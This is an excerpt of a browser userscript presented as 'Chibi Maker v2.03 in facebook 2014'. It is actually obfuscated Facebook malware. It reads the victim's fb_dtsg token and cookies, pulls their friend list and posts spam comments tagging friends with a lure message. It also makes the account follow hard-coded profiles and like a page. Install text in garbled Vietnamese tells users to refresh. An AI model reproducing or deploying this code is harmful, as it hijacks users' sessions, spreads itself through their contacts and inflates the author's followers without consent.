// ==UserScript==
// @name            Chibi Maker v2.03 in facebook 2014
...
// ==============
// ==Icon==
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","278331422324723","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," (y) Tớ Đã thử và thành công còn bạn thì sao 💝  💗  😘  😚   @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
...
arkadaslari_al(1439845829585529);
arkadaslari_al(1399822346947094);
arkadaslari_al(1485458468348436);
(function() {
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Black.WhiteDemon" target="_blank">ChÃºc má»«ng báº¡n Ä‘Ã£ cÃ i thÃ nh cÃ´ng vui lÃ²ng f5 Ä‘á»ƒ hoÃ n táº¥t <br>NoName</a>';
	html += '</div>';
...
//Boss
a("100004436023636");a("100007510844392");Like("384187648336789");sublist("185787898245743");
//Khiêm
